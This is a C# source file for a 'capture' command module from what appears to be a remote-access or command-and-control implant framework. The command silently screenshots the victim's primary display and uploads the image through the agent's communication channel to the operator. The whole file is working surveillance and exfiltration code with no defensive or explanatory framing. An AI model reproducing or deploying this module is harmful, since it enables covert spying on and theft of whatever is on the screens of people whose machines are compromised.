﻿using Agent.Commands;
using Agent.Models;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Media
{
    public class CaptureCommand : AgentCommand
    {
        public override string Name => "capture";
        public override void InnerExecute(AgentTask task, Agent.Models.Agent agent, AgentTaskResult result, CommModule commm)
        {
            Rectangle rc = Screen.PrimaryScreen.Bounds;
            var image = new Bitmap(rc.Width, rc.Height, System.Drawing.Imaging.PixelFormat.Format32bppArgb);
            using(Graphics memGraph = Graphics.FromImage(image))
            {
                memGraph.CopyFromScreen(rc.X, rc.Y, 0, 0, rc.Size, CopyPixelOperation.SourceCopy);
            }

            ImageConverter converter = new ImageConverter();
            var buff = (byte[])converter.ConvertTo(image, typeof(byte[]));

            var filename = $"capture/{Guid.NewGuid()}.png";
            commm.Upload(buff, filename, a =>
            {
                result.Completion = a;
                commm.SendResult(result);
            }).Wait();

            result.Result = $"Screen Captured to {filename}!";
        }
    }
}